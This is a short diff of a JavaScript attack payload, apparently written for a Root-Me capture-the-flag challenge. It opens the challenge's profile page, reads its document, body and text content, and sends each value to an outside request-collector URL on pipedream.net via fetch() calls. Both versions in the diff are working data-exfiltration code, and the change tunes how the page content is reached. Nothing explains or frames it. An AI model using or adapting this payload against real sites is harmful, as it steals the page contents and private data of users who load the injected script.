@@ -14,17 +14,17 @@ try{
 
 
 try{
-	var aaa = open('http://challenge01.root-me.org:58003/profile', 'target');
-	var bb = aaa.opener
+	var aaa = open('http://challenge01.root-me.org:58003/profile', '_blank');
+	var bb = aaa.document
 	try{
-		fetch('https://en6gc9c8vfzvo.x.pipedream.net/?openernew=' + bb, {mode: 'no-cors'});
+		fetch('https://en6gc9c8vfzvo.x.pipedream.net/?docunew=' + bb, {mode: 'no-cors'});
 
 		try{
-			var cc = aaa.document
-			fetch('https://en6gc9c8vfzvo.x.pipedream.net/?documentnew=' + cc, {mode: 'no-cors'});
+			var cc = aaa.document.body
+			fetch('https://en6gc9c8vfzvo.x.pipedream.net/?bodynew=' + cc, {mode: 'no-cors'});
 
 			try{
-				var dd = cc.body.textContent
+				var dd = aaa.document.body.textContent
 				fetch('https://en6gc9c8vfzvo.x.pipedream.net/?documentnewtext=' + dd, {mode: 'no-cors'});
 				
 			} catch (error) {
